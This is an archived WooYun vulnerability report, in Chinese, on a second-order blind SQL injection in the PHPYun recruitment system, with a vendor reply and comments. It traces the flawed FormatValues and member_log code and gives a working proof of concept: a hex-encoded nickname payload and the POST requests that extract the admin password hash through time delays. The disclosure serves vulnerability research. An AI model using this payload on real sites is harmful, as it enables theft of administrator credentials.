{"id": 47126, "wybug_id": "wooyun-2015-0122884", "wybug_title": "phpyun注入漏洞#2", "wybug_corp": "php云人才系统", "wybug_author": "Noxxx", "wybug_date": "2015-06-26 14:54", "wybug_open_date": "2015-09-24 15:08", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-24：\t细节向公众公开  简要描述： phpyun注入漏洞#2 详细说明：  文件名： \\app\\controller\\friend\\index.class.php中 有这样一句 \n$nid=$M->SaveFriendInfo($_POST,array(\"uid\"=>$this->uid));\n传入了整个post,我们跟进SaveFriendInfo看看.文件名： \\app\\model\\friend.model.php\nfunction SaveFriendInfo($Values=array(),$Where=array()){    \tif(empty($Where)){\t        $ValuesStr=$this->FormatValues($Values);\t        return $this->DB_insert_once('friend_info',$ValuesStr);    \t}else{ \t\t//很显然,Where是不为空的。\t        $WhereStr=$this->FormatWhere($Where);\t        $ValuesStr=$this->FormatValues($Values);//重点是看这个函数 \t        return $this->DB_update_all('friend_info',$ValuesStr,$WhereStr); //直接送入语句查询。    \t}    }\n文件名： \\app\\public\\action.class.php  FormatValues函数如下\nfunction FormatValues($Values){        $ValuesStr='';        foreach($Values as $k=>$v){            if(is_numeric($k)){                 $ValuesStr.=','.$v;            }else{                if(is_numeric($v)){ //看见没 如果 v为数字的话就 不加单引号 反之引上单引号。因为使用了 is_numeric函数的原因，0x111 这种格式的也可以通过限制 而mysql中也是可以直接解析0x的格式的， 所以我们直接寻找有没有二次注入的地方即可。                    $ValuesStr.=',`'.$k.'`='.$v;                }else{                    $ValuesStr.=',`'.$k.'`=\\''.$v.'\\'';                }            }        }        return substr($ValuesStr,1);    }\n寻找二次注入中...寻找到了。美中不足的地方就是只能延迟注入。文件:\\app\\controller\\ask\\friend.class.php 这个功能是关注功能..ID是对方的uid .可以自己注册 2个账号来操作。\nfunction atnuser_action(){\t\t$id=(int)$_POST['id'];\t\tif($id>0){\t\t\tif($this->uid){\t\t\t\t\t\t\t\tif($_POST['id']==$this->uid){\t\t\t\t\techo 4;die;\t\t\t\t}                $M=$this->MODEL('ask');\t\t\t\t$FriendM=$this->MODEL('friend');\t\t\t\t$atninfo = $M->GetAtnOne(array('uid'=>$this->uid,'sc_uid'=>$id));                 $UserInfoM=$this->MODEL('userinfo');                $user=$UserInfoM->GetMemberOne(array('uid'=>$id),array('field'=>'`usertype`'));\t\t\t\t$comurl = url(\"ask\",array(\"c\"=>\"friend\",\"uid\"=>$id));\t\t\t\t$row=$FriendM->GetFriendInfo(array('uid'=>$id));//看这里.查出friend_info表里的数据\t\t\t\t$name = $row['nickname'];//看这里把nickname查出来了赋值给$name\t\t\t\tif(is_array($atninfo)&&!empty($atninfo)){ //这句话的意思是你是否是对方的粉丝,如果是那么就取消关注，反之关注.\t\t\t\t\t$M->DeleteAtn(array('uid'=>$this->uid,'sc_uid'=>$id));                    $FriendM->SaveFriendInfo(array('`fans`=`fans`-1'),array('uid'=>$id));                    $FriendM->SaveFriendInfo(array('`atnnum`=`atnnum`-1'),array('uid'=>$this->uid));\t\t\t\t\t$this->addstate(\"取消了对<a href=\\\"\".$comurl.\"\\\">\".$name.\"</a>的关注！\",2);\t\t\t\t\t$this->automsg(\"用户 \".$this->username.\" 取消了对你的关注！\",$id);\t\t\t\t\t$M->member_log(\"取消了对\".$name.\"的关注！\");//看这里带入了$name\t\t\t\t\techo \"2\";die;\t\t\t\t}else{\t\t\t\t\t$M->insert_into(\"atn\",array('uid'=>$this->uid,'sc_uid'=>$id,'usertype'=>(int)$_COOKIE['usertype'],'sc_usertype'=>$user['usertype'],'time'=>time()));\t\t\t\t\t$FriendM->SaveFriendInfo(array('`fans`=`fans`+1'),array('uid'=>$id));\t\t\t\t\t$FriendM->SaveFriendInfo(array('`atnnum`=`atnnum`+1'),array('uid'=>$this->uid));\t\t\t\t\t$this->addstate(\"关注了<a href=\\\"\".$comurl.\"\\\">\".$name.\"</a>\",2);\t\t\t\t\t$this->automsg(\"用户 \".$this->username.\" 关注了你！\",$id);\t\t\t\t\t$M->member_log(\"关注了\".$name);//看这里带入了$name\t\t\t\t\techo \"1\";die;\t\t\t\t}\t\t\t}else{\t\t\t\techo \"3\";die;\t\t\t}\t\t}\t}\n我们在来分析member_log函数.文件 :app\\public\\action.class.php\nfunction member_log($content,$opera='',$type=''){\t\tif($_COOKIE['uid']){\t\t\t$value=\"`uid`='\".(int)$_COOKIE['uid'].\"',\";\t\t\t$value.=\"`usertype`='\".(int)$_COOKIE['usertype'].\"',\";\t\t\t$value.=\"`content`='\".$content.\"',\";\t\t\t$value.=\"`opera`='\".$opera.\"',\";\t\t\t$value.=\"`type`='\".$type.\"',\";\t\t\t$value.=\"`ip`='\".fun_ip_get().\"',\";\t\t\t$value.=\"`ctime`='\".time().\"'\";\t\t\t$this->DB_insert_once(\"member_log\",$value);\t\t}\t}\n看到这里我笑了..一般带DB_开头查询函数并没有进行转义操作. 可以造成注入.不管是取关还是加关都会造成二次注入.   漏洞证明：  接下来就是poc演示了.先注册2个账号,A和B.注：uid可以cookie中查询得到。先登录账号A：http://127.0.0.1:8081/php/phpyun/friend/c_saveinfo.htmlpost提交submitBtn=1&nickname=0x272c69703d28534c454550284d4944282853454c4543542050415353574f52442046524f4d2070687079756e5f61646d696e5f75736572204c494d49542031292c312c31293d273427292923nickname的数据是',ip=(SLEEP(MID((SELECT PASSWORD FROM phpyun_admin_user LIMIT 1),1,1)='4'))# 我们需要hex下,才不会被加上单引号；可以看到数据里已经更改掉数据了。\n\n现在我们来登录第二个账号Bhttp://127.0.0.1:8081/php/phpyun/ask/c_friend-a_atnuser.htmlPost提交id=1Id是你要关注的账号id也就是A的uid。（uid可以cookie中查询得到。）为了直观显示为就把sql语句输出了。\n\n看见没..成功执行了语句.密码第一位是4就延迟一秒。利用脚本我就不给出了，几个post请求判断的事。   修复方案：  可能还有其他因为这个函数所导致二次注入,需要完善FormatValues函数。   版权声明：转载请注明来源 Noxxx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-06-26 15:06 厂商回复： 感谢提供，我们会尽快修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-26 16:12 |    \t\tNoxxx \t\t\t( 普通白帽子  |\t\t\t        Rank:509 漏洞数:41        )\t\t \n  为啥小厂了    \n     2015-06-26 23:21 |    \t\t不能忍 \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:16        | 不要关注我，给我钱就好。)\t\t \n  @Noxxx 大牛如何看小厂还是大厂？    \n     2015-06-27 09:29 |    \t\tNoxxx \t\t\t( 普通白帽子  |\t\t\t        Rank:509 漏洞数:41        )\t\t \n  @不能忍 上主页就走大厂流程 确认rank没减就是大厂    \n     2015-09-25 08:08 |    \t\t小葵 \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:11        | 我们是害虫，我们是害虫！)\t\t \n  不得不mark一下，很经典    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}